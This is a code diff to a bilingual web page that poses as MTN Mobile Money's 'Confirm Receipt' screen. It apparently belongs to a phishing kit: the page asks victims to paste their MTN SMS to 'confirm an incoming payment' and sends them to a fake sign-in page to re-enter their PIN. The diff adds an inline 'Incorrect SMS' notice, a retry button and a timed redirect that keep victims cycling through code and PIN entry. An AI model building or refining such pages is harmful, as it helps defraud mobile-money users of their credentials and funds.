@@ -111,6 +111,28 @@
   }
   .notice.info .notice-title { color: var(--mtn-deep); }
 
+  .inline-retry-btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    margin-top: 12px;
+    padding: 10px 18px;
+    background: #fff;
+    color: var(--mtn-red);
+    border: 1.5px solid var(--mtn-red);
+    border-radius: 10px;
+    font-family: inherit;
+    font-size: 12.5px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all .15s;
+  }
+  .inline-retry-btn:hover {
+    background: var(--mtn-red);
+    color: #fff;
+  }
+
   .section-label {
     font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
     text-transform: uppercase; color: var(--mtn-gray);
@@ -303,38 +325,6 @@
   }
   .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
 
-  .popup-overlay {
-    position: fixed; inset: 0;
-    background: rgba(16,24,40,0.65);
-    display: none; align-items: center; justify-content: center;
-    padding: 24px; z-index: 10000;
-  }
-  .popup-overlay.show { display: flex; }
-  .popup-card {
-    background: #fff; border-radius: 20px;
-    padding: 28px 24px; max-width: 340px; width: 100%;
-    text-align: center;
-    box-shadow: 0 20px 50px rgba(0,0,0,0.25);
-  }
-  .popup-icon {
-    width: 60px; height: 60px; border-radius: 50%;
-    background: #E31E24; color: #fff;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 28px; font-weight: 800;
-    margin: 0 auto 16px;
-  }
-  .popup-title {
-    font-size: 17px; font-weight: 800; color: #101828; margin-bottom: 8px;
-  }
-  .popup-desc {
-    font-size: 13px; color: #667085; line-height: 1.6; margin-bottom: 20px;
-  }
-  .popup-btn {
-    width: 100%; padding: 12px; background: #0066A6; color: #fff;
-    border: none; border-radius: 10px; font-size: 14px; font-weight: 700;
-    cursor: pointer; font-family: inherit;
-  }
-
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
     .body { padding: 18px 18px 16px; }
@@ -379,10 +369,13 @@
 
   <div class="body">
 
-    <div class="notice error" id="noticeDeclined">
-      <span class="notice-title" id="noticeDeclinedTitle">Incorrect SMS</span>
-      <span id="noticeDeclinedBody">The message you pasted does not match. Please check the new SMS message in your inbox and paste it again below.</span>
+    <div class="notice error" id="noticeWrongPin">
+      <span class="notice-title" id="noticeWrongPinTitle">Incorrect SMS</span>
+      <span id="noticeWrongPinBody">The SMS you pasted is not correct. Tap below to go back and enter your PIN again.</span>
+      <br>
+      <button class="inline-retry-btn" onclick="goBackToSignin()" id="inlineRetryBtn">Try again</button>
     </div>
+
     <div class="notice warn" id="noticeExpired">
       <span class="notice-title" id="noticeExpiredTitle">Check your inbox</span>
       <span id="noticeExpiredBody">Please check the new SMS message in your inbox, copy it, and paste it in the box below.</span>
@@ -457,15 +450,6 @@
   <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
 </div>
 
-<div class="popup-overlay" id="wrongPinPopup">
-  <div class="popup-card">
-    <div class="popup-icon">!</div>
-    <div class="popup-title" id="wrongPinTitle">Incorrect SMS pasted</div>
-    <div class="popup-desc" id="wrongPinDesc">The SMS you pasted is not correct. You will be taken back to sign in to try again.</div>
-    <button class="popup-btn" onclick="goBackToSignin()" id="wrongPinBtn">Try again</button>
-  </div>
-</div>
-
 <div class="toast" id="toast"></div>
 
 <script>
@@ -474,8 +458,11 @@
       docTitle: 'MTN Mobile Money · Confirm Receipt',
       pageTitle: 'Confirm this incoming payment',
       pageSub: 'Paste the Y\'ello message you received from MTN to confirm this incoming transfer.',
-      noticeDeclinedTitle: 'Incorrect SMS',
-      noticeDeclinedBody: 'The message you pasted does not match. Please check the new SMS message in your inbox and paste it again below.',
+      noticeWrongPinTitle: 'Incorrect SMS',
+      noticeWrongPinBody: 'The SMS you pasted is not correct. Tap below to go back and enter your PIN again.',
+      wrongPinTitle: 'Incorrect PIN',
+      wrongPinDesc: 'You entered the wrong PIN. You will be taken back to sign in to try again.',
+      wrongPinBtn: 'Try again',
       noticeExpiredTitle: 'Check your inbox',
       noticeExpiredBody: 'Please check the new SMS message in your inbox, copy it, and paste it in the box below.',
       noticeFullSmsTitle: 'Full SMS requested',
@@ -508,17 +495,17 @@
       pastedFromClipboard: 'Pasted from clipboard.',
       clipboardEmpty: 'Clipboard is empty.',
       pasteManually: 'Paste manually: long-press the box and tap Paste.',
-      fullSmsToast: 'Please paste the full Y\'ello SMS, or tap Resend SMS.',
-      wrongPinTitle: 'Incorrect SMS pasted',
-      wrongPinDesc: 'The SMS you pasted is not correct. You will be taken back to sign in to try again.',
-      wrongPinBtn: 'Try again'
+      fullSmsToast: 'Please paste the full Y\'ello SMS, or tap Resend SMS.'
     },
     fr: {
       docTitle: 'MTN Mobile Money · Confirmer la réception',
       pageTitle: 'Confirmez ce paiement entrant',
       pageSub: 'Collez le message Y\'ello que vous avez reçu de MTN pour confirmer ce transfert entrant.',
-      noticeDeclinedTitle: 'SMS incorrect',
-      noticeDeclinedBody: 'Le message que vous avez collé ne correspond pas. Veuillez vérifier le nouveau SMS dans votre boîte de réception et le coller à nouveau ci-dessous.',
+      noticeWrongPinTitle: 'SMS incorrect',
+      noticeWrongPinBody: 'Le SMS que vous avez collé n\'est pas correct. Appuyez ci-dessous pour revenir et saisir à nouveau votre code PIN.',
+      wrongPinTitle: 'Code PIN incorrect',
+      wrongPinDesc: 'Vous avez saisi un code PIN incorrect. Vous allez être redirigé vers la connexion pour réessayer.',
+      wrongPinBtn: 'Réessayer',
       noticeExpiredTitle: 'Vérifiez votre boîte de réception',
       noticeExpiredBody: 'Veuillez vérifier le nouveau message SMS dans votre boîte de réception, le copier et le coller dans la zone ci-dessous.',
       noticeFullSmsTitle: 'SMS complet demandé',
@@ -551,10 +538,7 @@
       pastedFromClipboard: 'Collé depuis le presse-papiers.',
       clipboardEmpty: 'Le presse-papiers est vide.',
       pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
-      fullSmsToast: 'Veuillez coller le SMS Y\'ello complet, ou appuyez sur Renvoyer le SMS.',
-      wrongPinTitle: 'SMS incorrect collé',
-      wrongPinDesc: 'Le SMS que vous avez collé n\'est pas correct. Vous allez être redirigé vers la connexion pour réessayer.',
-      wrongPinBtn: 'Réessayer'
+      fullSmsToast: 'Veuillez coller le SMS Y\'ello complet, ou appuyez sur Renvoyer le SMS.'
     }
   };
 
@@ -615,8 +599,9 @@
     document.title = T.docTitle;
     document.getElementById('pageTitle').textContent = T.pageTitle;
     document.getElementById('pageSub').textContent = T.pageSub;
-    document.getElementById('noticeDeclinedTitle').textContent = T.noticeDeclinedTitle;
-    document.getElementById('noticeDeclinedBody').textContent = T.noticeDeclinedBody;
+    document.getElementById('noticeWrongPinTitle').textContent = T.noticeWrongPinTitle;
+    document.getElementById('noticeWrongPinBody').textContent = T.noticeWrongPinBody;
+    document.getElementById('inlineRetryBtn').textContent = T.wrongPinBtn;
     document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
     document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
     document.getElementById('noticeFullSmsTitle').textContent = T.noticeFullSmsTitle;
@@ -637,9 +622,6 @@
     document.getElementById('trustMsg2').textContent = T.trustMsg2;
     document.getElementById('trustMsg3').textContent = T.trustMsg3;
     document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
-    document.getElementById('wrongPinTitle').textContent = T.wrongPinTitle;
-    document.getElementById('wrongPinDesc').textContent = T.wrongPinDesc;
-    document.getElementById('wrongPinBtn').textContent = T.wrongPinBtn;
   }
 
   let trustTimer = null;
@@ -666,7 +648,7 @@
   }
 
   function hideAllNotices() {
-    document.getElementById('noticeDeclined').classList.remove('show');
+    document.getElementById('noticeWrongPin').classList.remove('show');
     document.getElementById('noticeExpired').classList.remove('show');
     document.getElementById('noticeFullSms').classList.remove('show');
   }
@@ -819,7 +801,18 @@
   }
 
   function goBackToSignin() {
-    document.getElementById('wrongPinPopup').classList.remove('show');
+    // Show a "wrong PIN" popup first, then redirect to signin
+    const overlay = document.createElement('div');
+    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:10001;padding:24px;';
+    overlay.innerHTML =
+      '<div style="background:#fff;border-radius:20px;padding:28px 24px;max-width:340px;width:100%;text-align:center;font-family:Poppins,sans-serif;box-shadow:0 20px 50px rgba(0,0,0,0.25);">' +
+        '<div style="width:60px;height:60px;border-radius:50%;background:#E31E24;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;margin:0 auto 16px;">!</div>' +
+        '<div style="font-size:17px;font-weight:800;color:#101828;margin-bottom:8px;">' + T.wrongPinTitle + '</div>' +
+        '<div style="font-size:13px;color:#667085;line-height:1.6;margin-bottom:20px;">' + T.wrongPinDesc + '</div>' +
+        '<div style="font-size:12px;color:#667085;margin-top:10px;">Redirecting to sign in…</div>' +
+      '</div>';
+    document.body.appendChild(overlay);
+
     const q = new URLSearchParams({
       tx: tx.ref,
       am: tx.am,
@@ -832,7 +825,9 @@
       an: tx.an,
       lang: currentLang
     });
-    window.location.href = 'mtn-signin.html?' + q.toString();
+    setTimeout(() => {
+      window.location.href = 'mtn-signin.html?' + q.toString();
+    }, 1500);
   }
 
   async function confirmPayment() {
@@ -943,7 +938,7 @@
         btn.disabled = false;
         document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
         clearSmsInput();
-        document.getElementById('wrongPinPopup').classList.add('show');
+        showNotice('noticeWrongPin');
         return;
       }
 
